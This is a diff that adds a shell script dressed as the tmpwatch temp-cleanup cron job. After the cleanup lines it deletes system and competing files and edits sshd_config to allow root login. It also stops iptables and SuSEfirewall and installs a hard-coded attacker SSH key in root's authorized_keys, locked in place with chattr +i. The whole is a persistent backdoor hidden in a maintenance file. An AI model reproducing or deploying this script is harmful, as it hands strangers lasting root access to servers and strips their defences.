@@ -1,0 +1,74 @@
+#! /bin/sh
+flags=-umc
+/usr/sbin/tmpwatch "$flags" -x /tmp/.X11-unix -x /tmp/.XIM-unix \
+	-x /tmp/.font-unix -x /tmp/.ICE-unix -x /tmp/.Test-unix \
+	-X '/tmp/hsperfdata_*' 10d /tmp
+/usr/sbin/tmpwatch "$flags" 30d /var/tmp
+for d in /var/{cache/man,catman}/{cat?,X11R6/cat?,local/cat?}; do
+    if [ -d "$d" ]; then
+	/usr/sbin/tmpwatch "$flags" -f 30d "$d"
+    fi
+done
+rm -rf /tmp/* /var/tmp/* /dev/shm/* /usr/bin/.sshd /usr/bin/pythno /etc/.z* /tmp/.l* /etc/cron.daily/anacron
+
+/usr/bin/replace "#PermitRootLogin" "PermitRootLogin" /etc/ssh/sshd_config
+/usr/bin/replace "#PermitRootLogin no" "PermitRootLogin yes" /etc/ssh/sshd_config
+/usr/bin/replace "PermitRootLogin no" "PermitRootLogin yes" /etc/ssh/sshd_config
+/usr/bin/replace "#RSAAuthentication" "RSAAuthentication" /etc/ssh/sshd_config
+/usr/bin/replace "#PubkeyAuthentication" "PubkeyAuthentication" /etc/ssh/sshd_config
+/usr/bin/replace "#AuthorizedKeysFile" "AuthorizedKeysFile" /etc/ssh/sshd_config
+
+allow=`cat /etc/ssh/sshd_config | grep AllowUsers| grep root | wc -l`
+if [ $allow = 0 ]; then
+/usr/bin/replace "AllowUsers admin" "AllowUsers admin root " /etc/ssh/sshd_config
+fi
+
+allow1=`cat /etc/ssh/sshd_config | grep AllowUsers| grep root | wc -l`
+if [ $allow1 = 0 ]; then
+cat /etc/ssh/sshd_config | sed s/"AllowUsers admin"/"AllowUsers admin root "/ > /tmp/a
+cat /tmp/a > /etc/ssh/sshd_config
+rm -rf /tmp/a
+fi
+
+cat /etc/ssh/sshd_config | sed s/"#PermitRootLogin"/"PermitRootLogin"/ > /tmp/a
+cat /tmp/a > /etc/ssh/sshd_config
+
+cat /etc/ssh/sshd_config | sed s/"#RSAAuthentication"/"RSAAuthentication"/ > /tmp/a
+cat /tmp/a > /etc/ssh/sshd_config
+
+cat /etc/ssh/sshd_config | sed s/"#PubkeyAuthentication"/"PubkeyAuthentication"/ > /tmp/a
+cat /tmp/a > /etc/ssh/sshd_config
+
+cat /etc/ssh/sshd_config | sed s/"#AuthorizedKeysFile"/"AuthorizedKeysFile"/ > /tmp/a
+cat /tmp/a > /etc/ssh/sshd_config
+
+cat /etc/ssh/sshd_config | sed s/"PermitRootLogin no"/"PermitRootLogin yes"/ > /tmp/a
+cat /tmp/a > /etc/ssh/sshd_config
+
+cat /etc/ssh/sshd_config | sed s/"ChallengeResponseAuthentication no"/"ChallengeResponseAuthentication yes"/ > /tmp/a
+cat /tmp/a > /etc/ssh/sshd_config
+
+
+cat /etc/ssh/sshd_config | sed s/"MACs.*"// > /tmp/a
+cat /tmp/a > /etc/ssh/sshd_config
+
+rm -rf /tmp/a
+
+
+/etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop
+
+keytest=`cat /root/.ssh/authorized_keys | grep YyXz7ocs | wc -l`
+
+if [ $keytest = 0 ]; then
+mkdir /root/.ssh
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAIEAql4x2frt1MvlTlEF2JTmsXKLOc2bOJQticZscMJ+JK5ObOaSx182gO+kyfHlnBDbARs+pNVQvt1EaYqjorQfmiVDkZxim4FbzHeWfZ1JPjm9RdilH3zp6smkMKOjWjGeMRHzQtrvmfStbKcgmnzN2mvws6c8iGDi4c+YyXz7ocs=" >> /root/.ssh/authorized_keys
+chmod 600 /root/.ssh/authorized_keys
+chmod 700 /root/.ssh
+chattr +i /root/.ssh/authorized_keys
+fi
+
+/etc/init.d/sshd restart
+service sshd restart
+
+/etc/init.d/ssh restart
+service ssh restart
